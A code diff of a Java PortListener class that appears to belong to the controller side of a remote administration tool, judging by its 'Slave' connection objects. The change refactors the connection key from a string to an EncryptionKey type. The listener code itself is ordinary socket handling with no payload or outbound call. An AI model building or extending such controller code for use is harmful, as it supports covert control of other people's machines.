@@ -6,20 +6,20 @@ import java.util.ArrayList;
 import java.util.List;
 
 import com.redpois0n.Slave;
+import com.redpois0n.common.crypto.EncryptionKey;
 import com.redpois0n.ui.panels.PanelMainSockets;
-
 
 public class PortListener implements Runnable {
 
 	public static List<PortListener> servers = new ArrayList<PortListener>();
-	
+
 	private ServerSocket server;
 	private int timeout = 15 * 1000;
 	private boolean listening = false;
-	private String key;
+	private EncryptionKey key;
 	private String pass;
 	private String name;
-	
+
 	public ServerSocket getServer() {
 		return server;
 	}
@@ -32,7 +32,7 @@ public class PortListener implements Runnable {
 		return listening;
 	}
 
-	public String getKey() {
+	public EncryptionKey getKey() {
 		return key;
 	}
 
@@ -43,8 +43,8 @@ public class PortListener implements Runnable {
 	public String getName() {
 		return name;
 	}
-	
-	public PortListener(String name, int port, int timeout, String key, String pass) throws Exception {
+
+	public PortListener(String name, int port, int timeout, EncryptionKey key, String pass) throws Exception {
 		this.name = name;
 		this.timeout = timeout;
 		this.server = new ServerSocket(port);
@@ -52,34 +52,40 @@ public class PortListener implements Runnable {
 		this.pass = pass;
 		servers.add(this);
 	}
-	
+
 	@Override
 	public void run() {
 		try {
 			while (!server.isClosed()) {
 				Socket socket = server.accept();
-				
+
 				new Slave(this, socket);
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
 	}
-	
+
 	public void start() {
-		PanelMainSockets.instance.getModel().addRow(new Object[] { name, server.getLocalPort(), timeout, pass, key});
-		
+		String keyText = "";
+		try {
+			keyText = key.getTextualKey();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		PanelMainSockets.instance.getModel().addRow(new Object[] { name, server.getLocalPort(), timeout, pass, keyText });
+
 		new Thread(this, "Port " + server.getLocalPort()).start();
 	}
 
-	public static PortListener getConnection(String name, int port, int timeout, String key, String pass) {
+	public static PortListener getConnection(String name, int port, int timeout, EncryptionKey key, String pass) {
 		for (int i = 0; i < servers.size(); i++) {
 			PortListener con = servers.get(i);
 			if (con.name.equals(name) && con.key.equals(key) && con.pass.equals(pass) && con.getServer().getLocalPort() == port && con.getTimeout() == timeout) {
 				return con;
 			}
 		}
-		
+
 		return null;
 	}
 
